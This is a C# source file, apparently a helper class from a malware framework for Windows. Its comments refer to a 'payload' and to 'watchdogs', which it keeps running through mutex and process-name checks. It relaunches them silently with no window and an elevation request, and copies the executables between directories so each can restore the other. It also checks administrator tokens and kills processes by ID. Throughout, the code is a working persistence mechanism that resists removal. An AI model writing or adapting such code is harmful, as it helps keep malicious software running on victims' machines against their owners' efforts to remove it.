using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Management.Automation;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using System.Xml.Linq;


    public class watchdogHelper
    {

        private static bool IsMutexRunning(string mutexName)
        {
            bool isNewInstance;
        try
        {
            // Attempt to create a mutex with the specified name
            using (Mutex mutex = new Mutex(false, mutexName, out isNewInstance))
            {
                // If a new instance was created, it means no other instance was running
                if (isNewInstance)
                {
                    // Release the mutex so it's not held by this check
                    return false;
                }
                else
                {
                    // If we couldn't create a new instance, another instance is already running
                    return true;
                }
            }
        }
        catch (Exception ex) {
            Log($"Error verifying if mutex is running: {ex.Message}");
            return false;
        }
        }

        private static bool IsProcessRunning(string processName)
        {
            // Get a list of processes by name
            processName = processName.Replace(".exe", "");

            Process[] processes = Process.GetProcessesByName(processName); //does processes by name when mutex cant be used (for the payload)
            return processes.Length > 0;
        }

        public static void Log(string message)
        {
            if (Config.Debugging)
            { //logs when specified by user in Config
                Console.WriteLine(message);
            }
        }

        public static void verifyFilePathsSourceAndDest(string destinationPath, string filename) //checks for if file exists then copies it if not
        {
            try
            {
            string currentDirectory = Directory.GetCurrentDirectory();
            string sourcePathFile = Path.Combine(currentDirectory, filename);
            string destPathFile = Path.Combine(destinationPath, filename);


            EnsureDirectoryExists(destinationPath);


            if (File.Exists(destPathFile) && File.Exists(sourcePathFile))
            {
                return;
            }
            else
            {

                if (File.Exists(sourcePathFile))
                {
                    // Copy the .exe to the destination
                    try
                    {
                        File.Copy(sourcePathFile, destPathFile, overwrite: false);
                        Log($"'{filename}' found and copied to {destPathFile}");
                    }
                    catch (Exception ex)
                    {
                        Log($"Error copying file: {ex.Message}");
                    }
                }
                else if (File.Exists(destPathFile))
                {
                    try
                    {
                        File.Copy(destPathFile, sourcePathFile, overwrite: false);
                        Log($"'{filename}' found and copied to {sourcePathFile}");
                    }
                    catch (Exception ex)
                    {
                        Log($"Error copying file: {ex.Message}");
                    }
                }
                else
                {
                    Log($"'{filename}' not found in the current directory.");
                }
            }
        }
        catch (Exception ex) {
            Log($"Error verifying and copying filepaths: {ex.Message}");
        }
        }


        private static void runBinary(string filePath, string arguments = "")
        {
        try
        {
            // Create a new ProcessStartInfo for the executable
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = filePath,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true,
                Verb = "runas" // Request elevated privileges
            };

            // Create a new instance of Process each time
            using (Process process = new Process())
            {
                process.StartInfo = startInfo;
                process.Start();

                // Optionally, handle output asynchronously if needed
                process.OutputDataReceived += (sender, e) =>
                {
                    if (e.Data != null)
                    {
                        // Handle output data here
                        Log($"Log from running binary: {e.Data}");
                    }
                };
                process.BeginOutputReadLine();

                // Note: No WaitForExit(), allowing the process to run without blocking
            }
        }
        catch (Exception ex) { 
        Log($"Error Running Binary: {ex.Message}");
        }
        }
    public static bool KillProcessById(int pid)
    {
        try
        {
            Process process = Process.GetProcessById(pid);
            process.Kill();
            process.WaitForExit(); // Optionally wait for the process to exit
            return true;
        }
        catch (ArgumentException)
        {
            Console.WriteLine("No process with the specified PID is running.");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Failed to kill process: {ex.Message}");
        }
        return false;
    }

    public static bool IsRunningAsAdministrator()
    {
        WindowsIdentity identity = WindowsIdentity.GetCurrent();
        WindowsPrincipal principal = new WindowsPrincipal(identity);
        return principal.IsInRole(WindowsBuiltInRole.Administrator);
    }

    public static string GetProcessPermissionLevel(int pid)
    {
        try
        {
            using (Process process = Process.GetProcessById(pid))
            {
                IntPtr processHandle = process.Handle;

                if (IsProcessElevated(processHandle))
                    return "Administrator";
                else
                    return "User";
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error: {ex.Message}");
            return "Unknown";
        }
    }

    private static bool IsProcessElevated(IntPtr processHandle)
    {
        IntPtr tokenHandle = IntPtr.Zero;
        try
        {
            if (OpenProcessToken(processHandle, TOKEN_QUERY, out tokenHandle))
            {
                var elevation = new TOKEN_ELEVATION();
                int elevationSize = Marshal.SizeOf(typeof(TOKEN_ELEVATION));
                IntPtr elevationPtr = Marshal.AllocHGlobal(elevationSize);

                try
                {
                    if (GetTokenInformation(tokenHandle, TOKEN_INFORMATION_CLASS.TokenElevation, elevationPtr, elevationSize, out _))
                    {
                        elevation = (TOKEN_ELEVATION)Marshal.PtrToStructure(elevationPtr, typeof(TOKEN_ELEVATION))!;
                        return elevation.TokenIsElevated != 0;
                    }
                }
                finally
                {
                    Marshal.FreeHGlobal(elevationPtr);
                }
            }
            return false;
        }
        finally
        {
            if (tokenHandle != IntPtr.Zero)
            {
                CloseHandle(tokenHandle);
            }
        }
    }

    // WinAPI functions and constants
    private const int TOKEN_QUERY = 0x0008;

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool OpenProcessToken(IntPtr processHandle, int desiredAccess, out IntPtr tokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool GetTokenInformation(IntPtr tokenHandle, TOKEN_INFORMATION_CLASS tokenInfoClass, IntPtr tokenInfo, int tokenInfoLength, out int returnLength);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hObject);

    private enum TOKEN_INFORMATION_CLASS
    {
        TokenElevation = 20
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct TOKEN_ELEVATION
    {
        public int TokenIsElevated;
    }

    public static int? GetProcessIdByName(string processName)
    {
        try
        {
            Process[] processes = Process.GetProcessesByName(processName);

            foreach (var process in processes)
            {
                // Skip the current process
                if (process.Id == Process.GetCurrentProcess().Id) continue;

                // Return the ID of the first instance found that's not the current process
                return process.Id;
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error: " + ex.Message);
        }

        return null; // Return null if no process is found or an error occurs
    }


    public static void CheckAndRunWatchdog(string watchdogPath, string watchdogName, string mutex)
        {
            if (!IsMutexRunning(mutex)) // uses mutexes to verify whether watchdogs are running
        {
                runBinary(Path.Combine(watchdogPath, watchdogName));
            }
        }

        public static void CheckAndRunPayload(string payloadPath, string payloadName)
        {
            if (!IsProcessRunning(payloadName)) // uses the filename to verify whether payload is running
        {
                runBinary(Path.Combine(payloadPath, payloadName));
            }
        }

        public static void EnsureDirectoryExists(string dirPath)
        {
            try
            {
                if (!Directory.Exists(dirPath))
                {
                    Directory.CreateDirectory(dirPath);
                }
            }
            catch (Exception ex)
            {
                // Log or handle the exception here
                Log($"An error occurred while creating the directory: {ex.Message}");
            }
        }


    }
